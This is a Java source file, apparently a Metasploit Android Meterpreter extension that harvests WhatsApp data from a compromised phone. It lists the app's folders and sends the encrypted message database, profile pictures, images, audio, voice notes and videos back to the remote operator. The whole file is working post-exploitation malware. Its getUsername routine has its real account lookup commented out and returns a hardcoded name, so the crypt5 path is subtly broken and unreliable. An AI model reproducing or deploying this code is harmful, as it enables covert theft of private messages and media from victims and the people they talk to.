package com.metasploit.meterpreter.android;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

//import android.accounts.Account;
//import android.accounts.AccountManager;
import android.os.Environment;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class dump_whatsapp_android implements Command {

	private static final int TLV_EXTENSIONS = 20000;
	private static final int TLV_TYPE_WHATSAPP_ENCRYPTED = TLVPacket.TLV_META_TYPE_RAW
			| (TLV_EXTENSIONS + 9022);
	private static final int TLV_TYPE_WHATSAPP_RAW = TLVPacket.TLV_META_TYPE_RAW
			| (TLV_EXTENSIONS + 9024);
	private static final int TLV_TYPE_WHATSAPP_ENUM_MSG = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9026);
	private static final int TLV_TYPE_WHATSAPP_ENUM_PP = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9027);
	private static final int TLV_TYPE_WHATSAPP_ENUM_VOI = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9028);
	private static final int TLV_TYPE_WHATSAPP_ENUM_VID = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9029);
	private static final int TLV_TYPE_WHATSAPP_ENUM_IMG = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9030);
	private static final int TLV_TYPE_WHATSAPP_ENUM_AUD = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9031);
	private static final int TLV_TYPE_WHATSAPP_STRING = TLVPacket.TLV_META_TYPE_STRING
			| (TLV_EXTENSIONS + 9032);
	private static final int TLV_TYPE_WHATSAPP_REQUEST = TLVPacket.TLV_META_TYPE_STRING
			| (TLV_EXTENSIONS + 9033);
	private static final int TLV_TYPE_WHATSAPP_GROUP = TLVPacket.TLV_META_TYPE_GROUP
			| (TLV_EXTENSIONS + 9034);

	private static final String whatsappDir = Environment
			.getExternalStorageDirectory().getPath() + "/WhatsApp/";
	private File tmpFile;

	@Override
	public int execute(Meterpreter meterpreter, TLVPacket request,
			TLVPacket response) throws Exception {

		String req = request.getStringValue(TLV_TYPE_WHATSAPP_REQUEST);

		if (req.equals("enumerate_all"))
			enumerate(response);

		else if (req.equals("enumerate_profiles"))
			enumProfiles(response);

		else if (req.equals("enumerate_media"))
			enumMedia(response);

		else if (req.equals("get_profile"))
			uploadFile(response, whatsappDir + "/Profile Pictures/",
					request.getIntValue(TLV_TYPE_WHATSAPP_ENUM_PP));

		else if (req.equals("get_image"))
			uploadFile(response, whatsappDir + "Media/WhatsApp Images/",
					request.getIntValue(TLV_TYPE_WHATSAPP_ENUM_IMG));

		else if (req.equals("get_audio"))
			uploadFile(response, whatsappDir + "Media/WhatsApp Audio/",
					request.getIntValue(TLV_TYPE_WHATSAPP_ENUM_AUD));

		else if (req.equals("get_voice"))
			uploadFile(response, whatsappDir + "Media/WhatsApp Voice Notes/",
					request.getIntValue(TLV_TYPE_WHATSAPP_ENUM_VOI));

		else if (req.equals("get_video"))
			uploadFile(response, whatsappDir + "Media/WhatsApp Video/",
					request.getIntValue(TLV_TYPE_WHATSAPP_ENUM_VID));

		else if (req.equals("dump_msgstore")) {

			try {

				if (fileExists(whatsappDir + "Databases/msgstore.db.crypt5")) {
					response.add(TLV_TYPE_WHATSAPP_ENCRYPTED,
							readFromStream(new FileInputStream(new File(
									whatsappDir
											+ "Databases/msgstore.db.crypt5"))));
					response.add(TLV_TYPE_WHATSAPP_STRING, "crypt5:"
							+ getUsername());
				} else {
					response.add(TLV_TYPE_WHATSAPP_ENCRYPTED,
							readFromStream(new FileInputStream(
									new File(whatsappDir
											+ "Databases/msgstore.db.crypt"))));
					response.add(TLV_TYPE_WHATSAPP_STRING, "crypt:");
				}
			} catch (Exception e) {
				response.add(TLV_TYPE_WHATSAPP_ENCRYPTED, new byte[] {});
				response.add(TLV_TYPE_WHATSAPP_STRING, new String());
			}
		}

		return ERROR_SUCCESS;
	}

	private void uploadFile(TLVPacket response, String dir, int index)
			throws IOException {
		List<File> fileList = new ArrayList<File>();
		try {

			for (File file : dirFiles(dir))
				if (file.isFile() && file.length() > 0 && !file.isHidden())
					fileList.add(file);

			response.add(TLV_TYPE_WHATSAPP_STRING, fileList.get(index)
					.getName());
			response.add(TLV_TYPE_WHATSAPP_RAW,
					readFromStream(new FileInputStream(fileList.get(index))));

		} catch (Exception e) {
			response.add(TLV_TYPE_WHATSAPP_STRING, new String());
			response.add(TLV_TYPE_WHATSAPP_RAW, new byte[] {});
		}

		fileList.clear();
	}

	private void enumMedia(TLVPacket response) throws IOException {
		String[] mediaDirs = { "WhatsApp Audio", "WhatsApp Video",
				"WhatsApp Voice Notes", "WhatsApp Images" };

		TLVPacket pckt, grp;
		for (String media : mediaDirs) {
			pckt = new TLVPacket();
			grp = new TLVPacket();

			for (File file : dirFiles(whatsappDir + "Media/" + media + "/")) {
				if (file.isFile() && file.length() > 0 && !file.isHidden())
					grp.addOverflow(TLV_TYPE_WHATSAPP_STRING, file.getName());
			}

			pckt.add(TLV_TYPE_WHATSAPP_STRING, media);
			pckt.add(TLV_TYPE_WHATSAPP_GROUP, grp);
			response.addOverflow(TLV_TYPE_WHATSAPP_GROUP, pckt);
		}
	}

	private void enumProfiles(TLVPacket response) throws IOException {
		for (File file : dirFiles(whatsappDir + "Profile Pictures/"))
			if (file.isFile() && file.length() > 0 && !file.isHidden())
				response.addOverflow(TLV_TYPE_WHATSAPP_STRING, file.getName());
	}

	private void enumerate(TLVPacket response) throws IOException {
		int filesCount;
		if (dirExists(whatsappDir) > 0) {
			filesCount = dirExists(whatsappDir + "Databases/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_MSG, filesCount);
			filesCount = dirExists(whatsappDir + "Media/WhatsApp Audio/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_AUD, filesCount);
			filesCount = dirExists(whatsappDir + "Media/WhatsApp Video/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_VID, filesCount);
			filesCount = dirExists(whatsappDir + "Media/WhatsApp Voice Notes/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_VOI, filesCount);
			filesCount = dirExists(whatsappDir + "Profile Pictures/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_PP, filesCount);
			filesCount = dirExists(whatsappDir + "Media/WhatsApp Images/");
			response.add(TLV_TYPE_WHATSAPP_ENUM_IMG, filesCount);
		} else {
			response.add(TLV_TYPE_WHATSAPP_ENUM_AUD, 0);
			response.add(TLV_TYPE_WHATSAPP_ENUM_VID, 0);
			response.add(TLV_TYPE_WHATSAPP_ENUM_VOI, 0);
			response.add(TLV_TYPE_WHATSAPP_ENUM_MSG, 0);
			response.add(TLV_TYPE_WHATSAPP_ENUM_PP, 0);
			response.add(TLV_TYPE_WHATSAPP_ENUM_IMG, 0);
		}
	}

	private File[] dirFiles(String path) {
		tmpFile = new File(path);
		if (tmpFile.exists() && tmpFile.isDirectory())
			return tmpFile.listFiles();
		return new File[] {};
	}

	private int dirExists(String path) {
		tmpFile = new File(path);
		if (tmpFile.exists() && tmpFile.isDirectory())
			return tmpFile.listFiles().length;
		return 0;
	}

	private boolean fileExists(String path) {
		tmpFile = new File(path);
		return (tmpFile.exists() && tmpFile.isFile());
	}

	private byte[] readFromStream(InputStream inputStream) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(baos);
		byte[] data = new byte[4096];
		int count = inputStream.read(data);
		while (count != -1) {
			dos.write(data, 0, count);
			count = inputStream.read(data);
		}

		return baos.toByteArray();
	}

	private String getUsername() throws ClassNotFoundException {
		/*AccountManager manager = AccountManager.get(AndroidMeterpreter
				.getContext());
		Account[] accounts = manager.getAccountsByType("com.google");
		List<String> possibleEmails = new LinkedList<String>();

		for (Account account : accounts) {
			possibleEmails.add(account.name);
		}

		if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
			return possibleEmails.get(0);
		} else
			return null;*/
		return "Anwar";
	}
}
